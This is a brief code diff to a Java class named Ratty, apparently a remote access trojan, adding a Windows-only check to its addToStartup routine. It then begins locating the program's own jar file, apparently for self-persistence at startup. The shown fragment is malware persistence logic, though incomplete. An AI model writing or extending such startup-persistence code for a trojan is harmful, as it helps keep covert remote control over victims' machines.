@@ -86,6 +86,12 @@ public final class Ratty {
 	}
 	
 	private static void addToStartup() {
+		final String os = System.getProperty("os.name").toUpperCase();
+		
+		if (!os.contains("WINDOWS")) {
+			return;
+		}
+		
 		try {
 			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
 			final File source = new File(sourceUri);
